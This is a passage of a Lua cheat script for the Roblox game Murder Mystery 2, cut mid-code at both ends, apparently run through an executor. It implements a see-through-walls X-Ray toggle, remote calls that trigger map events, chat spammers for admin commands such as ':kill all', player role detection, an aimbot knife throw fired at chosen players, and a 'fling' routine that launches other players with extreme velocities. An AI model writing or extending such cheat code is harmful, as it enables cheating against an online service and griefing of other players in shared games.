                        if basePartCount > 50 then break end
                    end
                end
                if basePartCount > 50 then
                    for _, v in pairs(mapCandidate:GetDescendants()) do
                        if v:IsA("BasePart") and not (LocalPlayer.Character and v:IsDescendantOf(LocalPlayer.Character)) then
                            v.LocalTransparencyModifier = state and 0.55 or 0
                        end
                    end
                    break
                end
            end
        end
    end

    MapTab:Section({
        Title = "Map Vision & X-Ray",
        TextSize = 15
    })

    MapTab:Toggle({
        Title = "X-Ray Mode",
        Desc = "Makes map walls translucent so you can see players through structures",
        Icon = "eye",
        Type = "Checkbox",
        Value = false,
        Callback = function(state)
            setMapXray(state)
            notify("X-Ray", "X-Ray Mode " .. (state and "ON" or "OFF"), 2, "eye")
        end
    })

    MapTab:Divider()

    MapTab:Button({
        Title = "Initiate Lockdown",
        Desc = "Research Facility map only",
        Locked = false,
        Callback = function()
            local interact = Workspace:WaitForChild("ResearchFacility"):WaitForChild("Interactive"):WaitForChild("SirenSystem"):WaitForChild("InteractiveBox"):WaitForChild("Interact")
            if interact then
                interact:FireServer()
            end
        end
    })

    MapTab:Button({
        Title = "Close Cloning Machine",
        Desc = "Research Facility map only",
        Locked = false,
        Callback = function()
            local interact = Workspace:WaitForChild("ResearchFacility"):WaitForChild("Interactive"):WaitForChild("CloningSystem"):WaitForChild("InteractiveBox"):WaitForChild("Interact")
            if interact then
                interact:FireServer()
            end
        end
    })

    MapTab:Button({
        Title = "Open / Close Garage",
        Desc = "Research Facility map only",
        Locked = false,
        Callback = function()
            local interact = Workspace:WaitForChild("ResearchFacility"):WaitForChild("Interactive"):WaitForChild("GarageSystem"):WaitForChild("InteractiveBox"):WaitForChild("Interact")
            if interact then
                interact:FireServer()
            end
        end
    })

    MapTab:Divider()

    MapTab:Button({
        Title = "Open Bank Vault",
        Desc = "Bank 2 map only",
        Locked = false,
        Callback = function()
            local interact = workspace:WaitForChild("Bank2"):WaitForChild("Interactive"):WaitForChild("VaultSystem"):WaitForChild("InteractiveBox"):WaitForChild("Interact")
            if interact then
                interact:FireServer()
            end
        end
    })
end
-------------------------------------------------------------------------------------------------------------------
task.wait()
local AdminTab = Window:Tab({
    Title = "Admin",
    Icon = "sparkles",
    Locked = false,
})

getgenv().CurrentAdminCustomInput = ""
getgenv().CurrentSheriffInput = ""
getgenv().CurrentMurdererInput = ""
getgenv().CurrentMapInput = ""

local function sendAdminChatCommand(cmd)
    if not cmd or cmd == "" then return end
    task.spawn(function()
        local sent = false
        pcall(function()
            local TextChatService = game:GetService("TextChatService")
            if TextChatService then
                local channel = (TextChatService.ChatInputBarConfiguration and TextChatService.ChatInputBarConfiguration.TargetTextChannel)
                    or (TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral"))
                    or (TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:GetChildren()[1])
                if channel and channel:IsA("TextChannel") then
                    channel:SendAsync(cmd)
                    sent = true
                end
            end
        end)
        if not sent then
            pcall(function()
                local r = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
                local req = r and r:FindFirstChild("SayMessageRequest")
                if req then
                    req:FireServer(cmd, "All")
                    sent = true
                end
            end)
        end
    end)
end

-- ==================== CUSTOM ADMIN COMMAND SPAMMER ====================
AdminTab:Input({
    Title = "Admin Command Input",
    Icon = "terminal",
    Placeholder = "e.g. /sheriff Name or :kill all",
    Callback = function(input)
        if not input or input:match("^%s*$") then return end
        getgenv().CurrentAdminCustomInput = input
    end
})

AdminTab:Button({
    Title = "Send Command Once",
    Desc = "Sends the entered custom admin command once",
    Callback = function()
        local cmd = getgenv().CurrentAdminCustomInput
        if cmd and cmd ~= "" then
            sendAdminChatCommand(cmd)
            notify("Admin", "Sent: " .. cmd, 2, "check")
        else
            notify("Admin", "Enter a command first!", 2, "x")
        end
    end
})

_G.AdminCustomSpammerActive = false
_G.AdminCustomSpammerThread = nil

AdminTab:Toggle({
    Title = "Admin Command Spammer",
    Desc = "Continuously spams the custom command every 0.3 seconds",
    Icon = "flame",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        _G.AdminCustomSpammerActive = state
        if state then
            if not getgenv().CurrentAdminCustomInput or getgenv().CurrentAdminCustomInput == "" then
                notify("Admin", "Enter a command first!", 2, "x")
            end
            if _G.AdminCustomSpammerThread then
                pcall(function() task.cancel(_G.AdminCustomSpammerThread) end)
                _G.AdminCustomSpammerThread = nil
            end
            _G.AdminCustomSpammerThread = task.spawn(function()
                while _G.AdminCustomSpammerActive do
                    local cmd = getgenv().CurrentAdminCustomInput
                    if cmd and cmd ~= "" then
                        sendAdminChatCommand(cmd)
                    end
                    task.wait(0.3)
                end
            end)
            notify("Admin", "Custom Spammer: ON (0.3s)", 2, "flame")
        else
            if _G.AdminCustomSpammerThread then
                pcall(function() task.cancel(_G.AdminCustomSpammerThread) end)
                _G.AdminCustomSpammerThread = nil
            end
            notify("Admin", "Custom Spammer: OFF", 2)
        end
    end
})

AdminTab:Divider()

-- ==================== SHERIFF SECTION ====================
AdminTab:Input({
    Title = "Sheriff Input",
    Icon = "ellipsis",
    Placeholder = "Enter Username",
    Callback = function(input)
        if not input or input:match("^%s*$") then 
            return 
        end
        getgenv().CurrentSheriffInput = input
        sendAdminChatCommand("/sheriff " .. input)
    end
})

AdminTab:Toggle({
    Title = "Auto Sheriff Input",
    Desc = "Automatically makes the inputted player sheriff every round.",
    Icon = "check",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        if state then
            if getgenv().CurrentSheriffInput and getgenv().CurrentSheriffInput ~= "" then
                sendAdminChatCommand("/sheriff " .. getgenv().CurrentSheriffInput)
            end
            local Event = ReplicatedStorage.Remotes.Gameplay.RoundEndFade
            getgenv().AutoSheriffInputConnection = Event.OnClientEvent:Connect(function()
                if getgenv().CurrentSheriffInput and getgenv().CurrentSheriffInput ~= "" then
                    sendAdminChatCommand("/sheriff " .. getgenv().CurrentSheriffInput)
                end
            end)
        else
            if getgenv().AutoSheriffInputConnection then
                getgenv().AutoSheriffInputConnection:Disconnect()
                getgenv().AutoSheriffInputConnection = nil
            end
        end
    end
})

_G.SheriffSpammerActive = false
_G.SheriffSpammerThread = nil

AdminTab:Toggle({
    Title = "Sheriff Input Spammer",
    Desc = "Continuously spams /sheriff <name> every 0.3 seconds until turned off",
    Icon = "flame",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        _G.SheriffSpammerActive = state
        if state then
            if not getgenv().CurrentSheriffInput or getgenv().CurrentSheriffInput == "" then
                notify("Admin", "Enter a Sheriff name first!", 2, "x")
            end
            if _G.SheriffSpammerThread then
                pcall(function() task.cancel(_G.SheriffSpammerThread) end)
                _G.SheriffSpammerThread = nil
            end
            _G.SheriffSpammerThread = task.spawn(function()
                while _G.SheriffSpammerActive do
                    local input = getgenv().CurrentSheriffInput
                    if input and input ~= "" then
                        sendAdminChatCommand("/sheriff " .. input)
                    end
                    task.wait(0.1)
                end
            end)
            notify("Admin", "Sheriff Spammer: ON (0.3s)", 2, "flame")
        else
            if _G.SheriffSpammerThread then
                pcall(function() task.cancel(_G.SheriffSpammerThread) end)
                _G.SheriffSpammerThread = nil
            end
            notify("Admin", "Sheriff Spammer: OFF", 2)
        end
    end
})

AdminTab:Divider()

-- ==================== MURDERER SECTION ====================
AdminTab:Input({
    Title = "Murderer Input",
    Icon = "ellipsis",
    Placeholder = "Enter Username",
    Callback = function(input)
        if not input or input:match("^%s*$") then 
            return 
        end
        getgenv().CurrentMurdererInput = input
        sendAdminChatCommand("/murderer " .. input)
    end
})

AdminTab:Toggle({
    Title = "Auto Murderer Input",
    Desc = "Automatically makes the inputted player murderer every round.",
    Icon = "check",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        if state then
            if getgenv().CurrentMurdererInput and getgenv().CurrentMurdererInput ~= "" then
                sendAdminChatCommand("/murderer " .. getgenv().CurrentMurdererInput)
            end
            local Event = ReplicatedStorage.Remotes.Gameplay.RoundEndFade
            getgenv().AutoMurdererInputConnection = Event.OnClientEvent:Connect(function()
                if getgenv().CurrentMurdererInput and getgenv().CurrentMurdererInput ~= "" then
                    sendAdminChatCommand("/murderer " .. getgenv().CurrentMurdererInput)
                end
            end)
        else
            if getgenv().AutoMurdererInputConnection then
                getgenv().AutoMurdererInputConnection:Disconnect()
                getgenv().AutoMurdererInputConnection = nil
            end
        end
    end
})

_G.MurdererSpammerActive = false
_G.MurdererSpammerThread = nil

AdminTab:Toggle({
    Title = "Murderer Input Spammer",
    Desc = "Continuously spams /murderer <name> every 0.3 seconds until turned off",
    Icon = "flame",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        _G.MurdererSpammerActive = state
        if state then
            if not getgenv().CurrentMurdererInput or getgenv().CurrentMurdererInput == "" then
                notify("Admin", "Enter a Murderer name first!", 2, "x")
            end
            if _G.MurdererSpammerThread then
                pcall(function() task.cancel(_G.MurdererSpammerThread) end)
                _G.MurdererSpammerThread = nil
            end
            _G.MurdererSpammerThread = task.spawn(function()
                while _G.MurdererSpammerActive do
                    local input = getgenv().CurrentMurdererInput
                    if input and input ~= "" then
                        sendAdminChatCommand("/murderer " .. input)
                    end
                    task.wait(0.1)
                end
            end)
            notify("Admin", "Murderer Spammer: ON (0.3s)", 2, "flame")
        else
            if _G.MurdererSpammerThread then
                pcall(function() task.cancel(_G.MurdererSpammerThread) end)
                _G.MurdererSpammerThread = nil
            end
            notify("Admin", "Murderer Spammer: OFF", 2)
        end
    end
})

AdminTab:Divider()

-- ==================== MAP SECTION ====================
AdminTab:Input({
    Title = "Map Input",
    Icon = "map",
    Placeholder = "Enter Map Name",
    Callback = function(input)
        if not input or input:match("^%s*$") then 
            return 
        end
        getgenv().CurrentMapInput = input
        sendAdminChatCommand("/map " .. input)
    end
})

AdminTab:Button({
    Title = "Set Map",
    Desc = "Sets the Map via Input",
    Callback = function()
        if not getgenv().CurrentMapInput or getgenv().CurrentMapInput == "" then
            return
        end
        sendAdminChatCommand("/map " .. getgenv().CurrentMapInput)
    end
})

AdminTab:Toggle({
    Title = "Auto Vote Map",
    Desc = "Automatically votes for the entered map every round.",
    Icon = "check",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        if state then
            if getgenv().CurrentMapInput and getgenv().CurrentMapInput ~= "" then
                sendAdminChatCommand("/map " .. getgenv().CurrentMapInput)
            end
            local Event = ReplicatedStorage.Remotes.Gameplay.RoundEndFade
            getgenv().AutoMapConnection = Event.OnClientEvent:Connect(function()
                if getgenv().CurrentMapInput and getgenv().CurrentMapInput ~= "" then
                    sendAdminChatCommand("/map " .. getgenv().CurrentMapInput)
                end
            end)
        else
            if getgenv().AutoMapConnection then
                getgenv().AutoMapConnection:Disconnect()
                getgenv().AutoMapConnection = nil
            end
        end
    end
})

_G.MapSpammerActive = false
_G.MapSpammerThread = nil

AdminTab:Toggle({
    Title = "Map Input Spammer",
    Desc = "Continuously spams /map <name> every 0.3 seconds until turned off",
    Icon = "flame",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        _G.MapSpammerActive = state
        if state then
            if not getgenv().CurrentMapInput or getgenv().CurrentMapInput == "" then
                notify("Admin", "Enter a Map name first!", 2, "x")
            end
            if _G.MapSpammerThread then
                pcall(function() task.cancel(_G.MapSpammerThread) end)
                _G.MapSpammerThread = nil
            end
            _G.MapSpammerThread = task.spawn(function()
                while _G.MapSpammerActive do
                    local input = getgenv().CurrentMapInput
                    if input and input ~= "" then
                        sendAdminChatCommand("/map " .. input)
                    end
                    task.wait(0.1)
                end
            end)
            notify("Admin", "Map Spammer: ON (0.3s)", 2, "flame")
        else
            if _G.MapSpammerThread then
                pcall(function() task.cancel(_G.MapSpammerThread) end)
                _G.MapSpammerThread = nil
            end
            notify("Admin", "Map Spammer: OFF", 2)
        end
    end
})

-------------------------------------------------------------------------------------------------------------------
-- (Notification system defined at top of file)
-------------------------------------------------------------------------------------------------------------------

-- =================================================================================================================
-- 2) STATE + CHARACTER / TOOL HELPERS
-- =================================================================================================================
getgenv().RanaxMM2 = getgenv().RanaxMM2 or {}
local V = getgenv().RanaxMM2
if V.AutoKnife == nil then V.AutoKnife = false end
if V.SilentKnifeThrow == nil then V.SilentKnifeThrow = false end
if V.KnifeThrowPriority == nil then V.KnifeThrowPriority = "Sheriff First" end
if V.KnifeThrowSpeed == nil then V.KnifeThrowSpeed = 150 end
if V.KnifePrediction == nil then V.KnifePrediction = 1.0 end
if V.KnifeMaxDistance == nil then V.KnifeMaxDistance = 350 end
if V.KnifeThrowDelay == nil then V.KnifeThrowDelay = 0.4 end
if V.RoleNotify == nil then V.RoleNotify = true end
if V.ProtectFriends == nil then V.ProtectFriends = true end
if getgenv().RanaxToastEnabled == nil then getgenv().RanaxToastEnabled = true end
if getgenv().RanaxFlingStop == nil then getgenv().RanaxFlingStop = false end
if getgenv().RanaxFlingActive == nil then getgenv().RanaxFlingActive = false end
if getgenv().RanaxFlingDepth == nil then getgenv().RanaxFlingDepth = 0 end
if V.AntiFling == nil then V.AntiFling = true end
if V.AntiFlingThreshold == nil then V.AntiFlingThreshold = 250 end
if V.SheriffDeathNotify == nil then V.SheriffDeathNotify = true end
if getgenv().RanaxNotifyEnabled == nil then getgenv().RanaxNotifyEnabled = true end

local function getHum(plr)
    plr = plr or LocalPlayer
    local char = plr.Character
    return char and char:FindFirstChildOfClass("Humanoid")
end

local function getRoot(plr)
    plr = plr or LocalPlayer
    local char = plr.Character
    if not char then return nil end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum and hum.RootPart then return hum.RootPart end
    return char:FindFirstChild("HumanoidRootPart")
end

local function getLinVel(part)
    local v
    local ok = pcall(function() v = part.AssemblyLinearVelocity end)
    if (not ok) or (not v) then
        pcall(function() v = part.Velocity end)
    end
    return v or Vector3.new()
end

local function setLinVel(part, v)
    local ok = pcall(function() part.AssemblyLinearVelocity = v end)
    if not ok then pcall(function() part.Velocity = v end) end
end

local function setAngVel(part, v)
    local ok = pcall(function() part.AssemblyAngularVelocity = v end)
    if not ok then pcall(function() part.RotVelocity = v end) end
end

local function setCharCFrame(part, cf)
    part.CFrame = cf
    local char = part.Parent
    if char and char:IsA("Model") then
        local ok = pcall(function() char:PivotTo(cf) end)
        if not ok then pcall(function() char:SetPrimaryPartCFrame(cf) end) end
    end
end

-- =================================================================================================================
-- Unified Anti-Fling Engine is managed in Section 6


local KNIFE_KEYWORDS = { "knife", "dagger", "blade", "scythe", "sword", "cleaver", "butterfly", "cutter", "slash", "stab", "harvester", "reaver", "axe", "bat", "saw", "candycorn" }
local GUN_KEYWORDS = { "gun", "revolver", "luger", "pistol", "blaster", "shotgun", "rifle", "musket", "laser", "crossbow", "bow", "shoot", "firearm", "vintage" }
local NON_WEAPON_KEYWORDS = { "bomb", "fake", "c4", "toy", "ggsign", "spray", "paint", "radio", "boombox", "pizza", "icecream", "chocolate", "teddy", "perk", "emote" }

local function matchesKeyword(name, list)
    local n = tostring(name):lower()
    for _, k in ipairs(list) do
        if n:find(k, 1, true) then return true end
    end
    return false
end

local _knifeToolCache = setmetatable({}, { __mode = "k" })
local function isKnifeTool(tool)
    if not tool or not (tool:IsA("Tool") or tool:IsA("Model")) then return false end
    local cached = _knifeToolCache[tool]
    if cached ~= nil then return cached end

    local toolName = tostring(tool.Name):lower()
    if matchesKeyword(toolName, NON_WEAPON_KEYWORDS) then
        _knifeToolCache[tool] = false
        return false
    end

    if matchesKeyword(tool.Name, KNIFE_KEYWORDS) then
        _knifeToolCache[tool] = true
        return true
    end

    -- Fast single pass over descendants
    for _, d in ipairs(tool:GetDescendants()) do
        local dn = d.Name:lower()
        if dn:find("bomb") or dn:find("fake") or dn:find("toy") then
            _knifeToolCache[tool] = false
            return false
        end
        if dn == "slash" or dn == "stab" or dn == "knifeserver" or dn == "throwknife" or dn == "knifestabbed" or dn == "handletouched" or dn == "knife" then
            _knifeToolCache[tool] = true
            return true
        end
    end

    _knifeToolCache[tool] = false
    return false
end

local function isGunTool(tool)
    if not tool or not (tool:IsA("Tool") or tool:IsA("Model")) then return false end
    local toolName = tostring(tool.Name):lower()
    if matchesKeyword(toolName, NON_WEAPON_KEYWORDS) then return false end
    if matchesKeyword(tool.Name, GUN_KEYWORDS) then return true end
    for _, d in ipairs(tool:GetDescendants()) do
        local dn = d.Name:lower()
        if dn == "shoot" or dn == "createbeam" or dn == "gunserver" or dn == "fire" or dn == "gun" or dn == "revolver" or dn == "raycastattachment" then
            return true
        end
    end
    return false
end

local function scanTools(plr)
    plr = plr or LocalPlayer
    local found = { knife = nil, gun = nil, all = {} }
    local containers = {}
    local char = plr.Character
    if char then containers[#containers + 1] = char end
    local bp = plr:FindFirstChildOfClass("Backpack")
    if bp then containers[#containers + 1] = bp end
    for _, cont in ipairs(containers) do
        for _, obj in ipairs(cont:GetChildren()) do
            if obj:IsA("Tool") then
                found.all[#found.all + 1] = obj
                if not found.knife and isKnifeTool(obj) then found.knife = obj end
                if not found.gun and isGunTool(obj) then found.gun = obj end
            end
        end
    end
    return found
end

getRoleOfPlayer = function(plr)
    if not plr then return "INNOCENT" end
    local t = scanTools(plr)
    if t.knife then return "MURDERER" end
    if t.gun then return "SHERIFF" end
    return "INNOCENT"
end
_G.getRoleOfPlayer = getRoleOfPlayer

getMurderer = function()
    local roles = GlobalPlayerRoles or getgenv().PlayerRoles or getgenv().NameRoles or {}
    for id, data in pairs(roles) do
        if data and typeof(data) == "table" and data.Role == "Murderer" then
            local targetPlr = nil
            for _, p in ipairs(Players:GetPlayers()) do
                if tostring(p.UserId) == tostring(id) or p.Name == id or p.Name == tostring(id) then
                    targetPlr = p
                    break
                end
            end
            if targetPlr and targetPlr ~= LocalPlayer and not IsFriend(targetPlr) and not isProtected(targetPlr) then
                local hum = getHum(targetPlr)
                if hum and hum.Health > 0 then
                    return targetPlr
                end
            end
        end
    end

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and not IsFriend(plr) and not isProtected(plr) then
            local hum = getHum(plr)
            if hum and hum.Health > 0 then
                if plr.Character then
                    for _, child in ipairs(plr.Character:GetChildren()) do
                        if isKnifeTool(child) then return plr end
                    end
                end
                local bp = plr:FindFirstChildOfClass("Backpack")
                if bp then
                    for _, child in ipairs(bp:GetChildren()) do
                        if isKnifeTool(child) then return plr end
                    end
                end
            end
        end
    end
    return nil
end
_G.getMurderer = getMurderer

local function getSheriff()
    local murd = (typeof(getMurderer) == "function" and getMurderer()) or nil

    -- 1. Check verified MM2 roles table
    local roles = GlobalPlayerRoles or getgenv().PlayerRoles or getgenv().NameRoles or {}
    for id, data in pairs(roles) do
        if data and typeof(data) == "table" and (data.Role == "Sheriff" or data.Role == "Hero") then
            local targetPlr = nil
            for _, p in ipairs(Players:GetPlayers()) do
                if tostring(p.UserId) == tostring(id) or p.Name == id or p.Name == tostring(id) then
                    targetPlr = p
                    break
                end
            end
            -- Must not be Murderer, self, or protected friend
            if targetPlr and targetPlr ~= LocalPlayer and targetPlr ~= murd and not IsFriend(targetPlr) and not isProtected(targetPlr) then
                local hum = getHum(targetPlr)
                if hum and hum.Health > 0 then
                    return targetPlr
                end
            end
        end
    end

    -- 2. Check player inventory for genuine GUN tools (strictly excluding knives and Murderer)
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr ~= murd and not IsFriend(plr) and not isProtected(plr) then
            local hum = getHum(plr)
            if hum and hum.Health > 0 then
                if plr.Character then
                    for _, child in ipairs(plr.Character:GetChildren()) do
                        if isGunTool(child) and not isKnifeTool(child) then return plr end
                    end
                end
                local bp = plr:FindFirstChildOfClass("Backpack")
                if bp then
                    for _, child in ipairs(bp:GetChildren()) do
                        if isGunTool(child) and not isKnifeTool(child) then return plr end
                    end
                end
            end
        end
    end
    return nil
end

-- =================================================================================================================
-- 3) AUTO-EQUIP KNIFE + SILENT KNIFE THROW (SMOOTH & ADVANCED - NO TELEPORT)
-- =================================================================================================================
local function equipKnife()
    local char = LocalPlayer.Character
    if not char then return nil end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return nil end
    local held = char:FindFirstChildOfClass("Tool")
    if held and isKnifeTool(held) then return held end
    local t = scanTools(LocalPlayer)
    local knife = t.knife
    if knife and isKnifeTool(knife) then
        if knife.Parent ~= char then
            pcall(function() hum:EquipTool(knife) end)
        end
        return knife
    end
    return nil
end

local function getPredictedKnifePos(target, startPos)
    local troot = target and getRoot(target)
    if not troot then return startPos + Vector3.new(0, 0, -20) end
    local basePos = troot.Position + Vector3.new(0, 1.2, 0) -- Torso height
    local dist = (basePos - startPos).Magnitude
    local vel = getLinVel(troot)
    local speed = V.KnifeThrowSpeed or 150
    local mult = V.KnifePrediction or 1.0
    local travel = math.clamp(dist / speed, 0.02, 0.4) * mult
    -- Lead target based on velocity
    local predicted = basePos + (Vector3.new(vel.X, 0, vel.Z) * travel)
    -- Gravity arc compensation
    local gravity = Workspace.Gravity or 196.2
    local arcDrop = 0.5 * gravity * (travel ^ 2) * 0.08
    return predicted + Vector3.new(0, arcDrop, 0)
end

-- Fare pozisyonunu hedef ekran koordinatina tasi (aimbot core)
-- [moveMouseToWorld defined earlier]

-- Right click / throw knife
local function simulateRightClick(worldPos)
    local cam = Workspace.CurrentCamera
    local screenPos = cam and cam:WorldToViewportPoint(worldPos)
    local cx = (screenPos and screenPos.X) or (cam and cam.ViewportSize.X / 2) or 960
    local cy = (screenPos and screenPos.Y) or (cam and cam.ViewportSize.Y / 2) or 540

    -- executor mouse2click
    if typeof(mouse2click) == "function" then
        pcall(mouse2click)
    elseif typeof(mouse2press) == "function" and typeof(mouse2release) == "function" then
        pcall(mouse2press)
        task.wait(0.03)
        pcall(mouse2release)
    else
        -- VirtualInputManager sag tik
        pcall(function()
            VirtualInputManager:SendMouseButtonEvent(cx, cy, 1, true, game, 1)
            task.wait(0.03)
            VirtualInputManager:SendMouseButtonEvent(cx, cy, 1, false, game, 1)
        end)
        -- VirtualUser fallback
        pcall(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new(cx, cy))
        end)
    end
end

local function checkKnifeWallPass(origin, targetPos, targetChar)
    if not V.KnifeWallCheck then return true end
    local dir = targetPos - origin
    if dir.Magnitude < 1 then return true end

    local rayParams = RaycastParams.new()
    rayParams.FilterType = Enum.RaycastFilterType.Exclude
    local excludeList = { LocalPlayer.Character }
    for _, p in ipairs(Players:GetPlayers()) do
        if (IsFriend(p) or isProtected(p)) and p.Character then
            table.insert(excludeList, p.Character)
        end
    end
    rayParams.FilterDescendantsInstances = excludeList

    local result = Workspace:Raycast(origin, dir, rayParams)
    if not result then return true end
    if targetChar and result.Instance and result.Instance:IsDescendantOf(targetChar) then return true end
    if result.Instance and (result.Instance.Transparency > 0.65 or result.Instance.CanCollide == false) then return true end

    return false
end

-- ============================================================
-- AIMBOT KNIFE THROW - Fare hedefe kitlenir, hedef olunce birakir
-- ============================================================
local knifeThrowActive = false

local function throwKnifeAtTarget(target)
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local myHRP = char and char:FindFirstChild("HumanoidRootPart")
    if not (char and hum and myHRP) then return false, "Character not ready" end

    local knife = char:FindFirstChild("Knife") or LocalPlayer.Backpack:FindFirstChild("Knife")
    if not knife then return false, "No knife equipped" end

    local near = target
    if not near or not near.Character or not near.Character:FindFirstChild("HumanoidRootPart") then
        local dist = 200
        for _, v in ipairs(Players:GetPlayers()) do
            if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                if not IsFriend(v) and not isProtected(v) and not IsPlayerInLobby(v) then
                    local d = (myHRP.Position - v.Character.HumanoidRootPart.Position).Magnitude
                    if d <= 200 and d < dist then
                        if checkKnifeWallPass(myHRP.Position, v.Character.HumanoidRootPart.Position, v.Character) then
                            dist = d
                            near = v
                        end
                    end
                end
            end
        end
    end

    if not near or not near.Character or not near.Character:FindFirstChild("HumanoidRootPart") then
        return false, "No valid target"
    end

    if IsFriend(near) or isProtected(near) then
        return false, "Target is protected friend"
    end

    if IsPlayerInLobby(near) then
        return false, "Target is in Lobby"
    end

    local targetPos = near.Character.HumanoidRootPart.Position
    local dist = (myHRP.Position - targetPos).Magnitude
    if dist > 200 then
        return false, "Target farther than 200 studs"
    end

    if not checkKnifeWallPass(myHRP.Position, targetPos, near.Character) then
        return false, "Target is behind a wall"
    end

    if knife.Parent == LocalPlayer.Backpack and hum then
        hum:EquipTool(knife)
    end

    local origin = myHRP.Position
    local args = {
        [1] = CFrame.new(origin, targetPos) * CFrame.Angles(1.4531978368759155, 0.04432811588048935, 1.6501713991165161),
        [2] = CFrame.new(targetPos) * CFrame.Angles(-0, 0, -0)
    }

    local events = knife:FindFirstChild("Events")
    local remote = (events and events:FindFirstChild("KnifeThrown")) or knife:FindFirstChild("KnifeThrown", true)
    if not remote then
        pcall(function()
            local gameplay = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Gameplay")
            if gameplay then remote = gameplay:FindFirstChild("KnifeThrown", true) end
        end)
    end

    if remote then
        remote:FireServer(unpack(args))
        return true, near.Name
    end

    pcall(function() knife:Activate() end)
    return true, near.Name
end

local function chooseKnifeTarget()
    local root = getRoot(LocalPlayer)
    if not root then return nil end
    local candidates = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and not isProtected(plr) and not IsFriend(plr) and not IsPlayerInLobby(plr) then
            local hum = getHum(plr)
            local troot = getRoot(plr)
            if hum and troot and hum.Health > 0 then
                local d = (troot.Position - root.Position).Magnitude
                if d <= 200 and checkKnifeWallPass(root.Position, troot.Position, plr.Character) then
                    candidates[#candidates + 1] = plr
                end
            end
        end
    end
    if #candidates == 0 then return nil end

    local prio = V.KnifeThrowPriority or "Sheriff First"
    if prio == "Sheriff First" then
        local s = getSheriff()
        if s and not IsPlayerInLobby(s) then
            local st = getRoot(s)
            if st and (st.Position - root.Position).Magnitude <= 200 then
                return s
            end
        end
    elseif prio == "Murderer First" then
        local m = getMurderer()
        if m and not IsPlayerInLobby(m) then
            local mt = getRoot(m)
            if mt and (mt.Position - root.Position).Magnitude <= 200 then
                return m
            end
        end
    end

    local best, bestD = nil, 200
    for _, plr in ipairs(candidates) do
        local troot = getRoot(plr)
        if troot then
            local d = (troot.Position - root.Position).Magnitude
            if d <= bestD then bestD = d; best = plr end
        end
    end
    return best or candidates[1]
end

-- =================================================================================================================
-- 4) MULTI-TARGET FLING ENGINE (zqyDSUWX / KILASIK mechanics)
-- =================================================================================================================
VFling = function(TargetPlayer)
    if not TargetPlayer or not TargetPlayer.Parent then return end
    if IsFriend(TargetPlayer) or isProtected(TargetPlayer) then return end

    getgenv().RanaxFlingDepth = (getgenv().RanaxFlingDepth or 0) + 1

    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local root = hum and hum.RootPart
    if not (char and hum and root) then return end

    local tchar = TargetPlayer.Character
    if not tchar then return end
    local thum = tchar:FindFirstChildOfClass("Humanoid")
    local troot = thum and thum.RootPart
    local thead = tchar:FindFirstChild("Head")
    local acc = tchar:FindFirstChildOfClass("Accessory")
    local handle = acc and acc:FindFirstChild("Handle")
    if not thum then return end
    if not tchar:FindFirstChildWhichIsA("BasePart") then return end
    if thum.Sit then return end

    local OldPos = root.CFrame
    if getLinVel(root).Magnitude < 50 then
        getgenv().RanaxOldPos = root.CFrame
    elseif getgenv().RanaxOldPos then
        OldPos = getgenv().RanaxOldPos
    end

    local cam = Workspace.CurrentCamera
    if cam then
        if thead then
            cam.CameraSubject = thead
        elseif handle then
            cam.CameraSubject = handle
        elseif troot then
            cam.CameraSubject = thum
        end
    end

    local FPos = function(BasePart, Pos, Ang)
        local cf = CFrame.new(BasePart.Position) * Pos * Ang
        setCharCFrame(root, cf)
        setLinVel(root, Vector3.new(9e7, 9e7 * 10, 9e7))
        setAngVel(root, Vector3.new(9e8, 9e8, 9e8))
    end

    local SFBasePart = function(BasePart)
        local TimeToWait = 2
        local startT = tick()
        local Angle = 0
        repeat
            if root and root.Parent and thum then
                local mag = getLinVel(BasePart).Magnitude
                if mag < 50 then
                    Angle = Angle + 100
                    local dir = thum.MoveDirection * (mag / 1.25)
                    FPos(BasePart, CFrame.new(0, 1.5, 0) + dir, CFrame.Angles(math.rad(Angle), 0, 0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, -1.5, 0) + dir, CFrame.Angles(math.rad(Angle), 0, 0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, 1.5, 0) + dir, CFrame.Angles(math.rad(Angle), 0, 0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, -1.5, 0) + dir, CFrame.Angles(math.rad(Angle), 0, 0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, 1.5, 0) + thum.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, -1.5, 0) + thum.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
                    task.wait()
                else
                    FPos(BasePart, CFrame.new(0, 1.5, thum.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, -1.5, -thum.WalkSpeed), CFrame.Angles(0, 0, 0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, 1.5, thum.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                    task.wait()
